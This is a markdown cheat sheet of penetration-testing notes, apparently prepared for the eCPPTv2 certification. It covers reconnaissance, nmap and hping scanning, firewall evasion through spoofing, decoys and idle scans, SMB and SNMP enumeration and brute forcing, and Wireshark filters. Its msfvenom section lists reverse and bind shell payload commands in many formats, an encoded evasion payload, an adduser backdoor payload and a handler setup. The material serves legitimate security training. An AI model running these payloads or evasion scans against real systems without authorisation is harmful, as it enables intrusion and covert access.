# eCPPTv2
eCPPTv2 Notes

# Information Gathering

## Whois Lookup

###### Query information from domain:
```
whois <domain>
```

###### Use a different whois server:
```
whois -h <server> <domain>
```

## DNS

###### Performs a basic DNS Query:
```
nslookup <target>
```

###### List mail exchange servers for a given domain:
```
nslookup -query=mx <domain>
```

###### List nameservers:
```
nslookup -query=ns <domain>
```

###### List all information:
```
nslookup -query=any <domain>
```

###### Returns mails server within specified domain:
```
dig +nocmd <domain> MX +noall +answer
```

###### Query the A records:
```
dig +nocmd <domain> A +noall +answer
```

###### Returns name servers within specified domain:
```
dig +nocmd <domain> NS +noall +answer
```

###### Attempts a zone transfer from specified name server:
```
dig +nocmd axfr <@name_server> <domain> +noall +answer
```

###### Automates domain enumeration. Performs zone transfer, subdomain brute force, and more:
```
fierce -dns <domain> --dnsserver <server>
```

###### Attempts to brute forces subdomains of specified domain:
```
dnsmap <domain>
```

###### List A, NS, MX and mapping ip adresses in one scan:
```
dnsrecon -d <domain>
```

###### Automates domain enumeration:
```
dnsenum <domain>
```

## Host Discovery with Fping Hping Nmap

###### Before a SYN scan with wihtout arp ping:
```
nmap -sn <target> --disable-arp-ping
```

###### Before a SYN scan with wihtout arp ping and with TCP packet with a SYN flag attached:
```
nmap -sn -PS <target> --disable-arp-ping
```

###### Before a SYN scan with wihtout arp ping and with TCP packet with a ACK flag attached:
```
nmap -sn -PA <target> --disable-arp-ping
```

###### Before a SYN scan with wihtout arp ping and with TCP packet with ICMP echo request:
```
nmap -sn -PE <target> --disable-arp-ping
```

###### Send ICMP echo request packets and only display hosts that are alive:
```
fping -A <target>
```

###### Send ICMP echo request packets and only display hosts that are alive and specify the number of retries (-r):
```
fping -A <target> -r <number of retries>
```

###### Specify a range of ip addresses such as a whole subnet (-g), send ICMP packets to every host in subnet, display time required to reach host (-e) and force fping to be quiet (-q):
```
fping -q -a -g <target> <subnet to scan> -r 0 -e
```

# Scanning

## Hping

###### Perform a SYN scan for range of ports:
```
hping3 -S -p <port> <target>
```

###### Specify a port range:
```
hping3 -S --scan 1-1000 <target>
```

###### SYN scan all ports:
```
hping3 -S --scan all <target>
```

###### SYN scan a list of ports:
```
hping3 -S --scan 80,445,53,21 <target>
```

## Nmap

###### Simple SYN scan:
```
nmap -sS <target>
```

###### Increase scan speed by disabling DNS resolution -n and treating parget as online -Pn:
```
nmap -sS <target> -n -Pn 
```

###### Execute TCP connect scan -sT in fast mode -F which scans fewer ports than the default scan:
```
nmap -sT <target> -F
```

###### Scan UDP ports:
```
nmap -sU <target>
```

###### TCP null scan:
```
nmap -sN <target>
```

###### Christmas scan:
```
nmap -sX <target>
```

###### FIN scan:
```
nmap -sF <target>
```

## Nmap NSE

###### NSE scripts are located in:
```
/usr/share/nmap/scripts/
```

###### Execute default set of scripts:
```
nmap -c
```

###### Specify certain script:
```
nmap --script 
```

###### How to update scripts:
```
nmap --script-updatedb
```

###### Get help for certain script catagory (example help for SMB discovery scripts):
```
nmap --script-help “smb*” and discovery
```

###### Lookup whois information:
```
nmap --script whois-domain <website> -sn
```

###### SMB OS discovery:
```
nmap --script smb-os-discovery -p 445 <target>
```

###### Enumerate all SMB shares:
```
nmap --script smb-enum-shares <target> -p 445
```

###### Execute all authentication related scripts:
```
nmap --script auth <target>
```

## Idle Scan Hping Nmap

**Idle scan is stealthy because the target host will never know the real attacker's ip**

###### Probes a zombie candidate:
```
hping3 -S -r -p <port> <zombie_ip>
```

###### Spoofs zombie’s IP and probes target:
```
hping3 -a <zombie_ip> -S -p <dst_port> <target>
```

###### Determines if IP ID is incremental:
```
nmap --script ipidseq <target> -p <port>
```

###### Performs Idle scan. (performs previous two steps simultaneously):
```
nmap -Pn -sI -p <dst_port> <zombie_ip>:<src_port> <target>
```

## Advanced Port Scanning

###### Fragment packets:
```
nmap -f <target> -n --disable-arp-ping -Pn
```

###### Fragmented SYN scan:
```
nmap -sS -f <target>
```

###### Performs a scan using decoys:
```
nmap -p <port> -D <decoy1,ME,decoy2,etc..> <target>
```

###### Use random number of decays:
```
nmap -D RND:10 <target> -sS -p <port> -Pn --disable-arp-ping
```

###### Port scan using DNS as source port 53:
```
nmap --source-port 53 <target> -sS
```

###### Port scan well known ports using DNS as source port:
```
hping3 -S -s 53 --scan known <target>
```

###### Spoof MAC address (useful if firewall only accepts packets from specific MAC addresses):
```
nmap --spoof-mac <choose vendor MAC i.e. Apple or Intel etc..> <target> -p <port> -Pn --disable-arp-ping -n
```

###### Random MAC address:
```
nmap --spoof-mac 0 <target> -p <port> -Pn --disable-arp-ping -n
```

###### Delayed scan with randomized hosts from a list of hosts:
```
nmap -iL hosts.list -sS -p <port> --randomize-hosts -T 2
```

###### Spoof IP address of alive host:
```
hping3 -a <alive host on network> -S -p <port> <target>
```

###### Evade firewalls that use packet size to detect port scans:
```
nmap -sS --data-length 10 -p 21 <target>
```

# Enumeration

## NetBIOS and Null Session
```
nmap -sS -p 135 <target>
```

###### Probes NetBIOS info of machine:
```
nbtscan -v <target>
```

###### Displays system shares information:
```
nmblookup -A <target>
```
###### Lists all shared shares of target:
```
smbclient -L <target>
```

###### Enumerates information on target Windows system (shares, users, etc):
```
enum4linux -a <target>
```

###### Attempts to access a shared resources with no credentials (null session):
```
smbclient \\\\<target>\\<share> -N
```

###### Attempt to connect to RPC service with no credentials:
```
rpcclient -N -U "" <target>
```

###### Attempts to bruteforce SMB credentials with nmap:
```
nmap --script=smb-brute <target>
```

## SNMP Enumeration

###### Enumerates SNMP info of the given target:
```
snmpwalk -c <c_string> -v <version> <target>
```

###### Attempts to brute force SNMP community string:
```
nmap -sU -p 161 --script=snmp-brute <target>
```

###### Enumerate users:
```
nmap -sU -p 161 --script snmp-win32-users <target>
```

###### Lists all SNMP-related nmap scripts:
```
ls -l /usr/share/nmap/script | grep -i snmp
```

###### Obtains SNMP info at specified OID:
```
snmpwalk -c <c_string> -v <version> <target> <OID>
```

###### Changes the SNMP information at specified OID:
```
snmpset -c <c_string> -v <version> <target> <OID> <value_type> <value>
```

###### Onesixtyone brute force:
```
echo public > community
echo private >> community
echo manager >> community
onesixtyone -c community <target>
```

###### Enumerate system processes:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.2.1.25.1.6.0
```

###### Enumerate running programs:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.2.1.25.4.2.1.2
```

###### Enumerate processes path:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.2.1.25.4.2.1.4
```

###### Enumerate storage units:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.2.1.25.2.3.1.4
```

###### Enumerate software name:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.2.1.25.6.3.1.2
```

###### Enumerate user accounts:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.4.1.77.1.2.25
```

###### Enumerate tcp local ports:
```
snmpwalk -c <community string> -<version> <target> 1.3.6.1.2.1.6.13.1.3
```

# MSFVenom

## List Payloads
```
msfvenom -l
```

## Binaries Payloads

###### Linux Meterpreter Reverse Shell:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf
```

###### Linux Bind Meterpreter Shell
```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > bind.elf
```

###### Linux Bind Shell
```
msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > term.elf
```

###### Windows Meterpreter Reverse TCP Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```

###### Windows Reverse TCP Shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```

###### Windows Encoded Meterpreter Windows Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

## Web Payloads

###### PHP Meterpreter Reverse TCP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
```

###### ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp
```

###### JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
```

## WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
```

## Scripting Payloads

###### Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
```

###### Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```

###### Perl Unix Reverse shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
```

## Shellcode

###### Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```

###### Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```

###### POP Calulator
```
msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f c
```

## Create User
```
msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
```

## Metasploit Handler
```
use exploit/multi/handler
set PAYLOAD <Payload name>
set RHOST <Remote IP>
set LHOST <Local IP>
set LPORT <Local Port>
Run
```

# Wireshark

###### Filter packets by IP
```
ip.addr==<ip>
```

###### Filter packets sent from a specific address
```
ip.src==<ip>
```

###### Specify destination IP
```
ip.dst==<ip>
```

###### Filter traffic by request method
```
http.request.method == POST
```

###### Filter ARP traffic
```
arp
```

###### Filter HTTP traffic
```
http
```

###### Filter ICMP traffic
```
icmp
```

###### Filter HTTP or DNS traffic
```
http or dns
```

###### Filter HTTP or DNS traffic coming from specific address
```
ip.addr==<ip> and (dns or http)
```

###### Don't capture HTTP traffic from a specific IP
```
http and ip.src!=<ip>
```

###### Filter traffic from specific tcp port
```
tcp.port==<port>
```

###### Filter traffic from specific udp port
```
udp.port==<port>
```

###### Capture packets with SYN flag enabled
```
tcp.flags.syn==1
```

###### Capture packets with SYN and ACK
```
tcp.flags.syn==1 and tcp.flags.ack==1
```

###### Capture packets with SYN and ACK inside a subnet
```
tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==192.168.1.0/24
```

###### Filter packets by string
```
tcp contains "string"
```
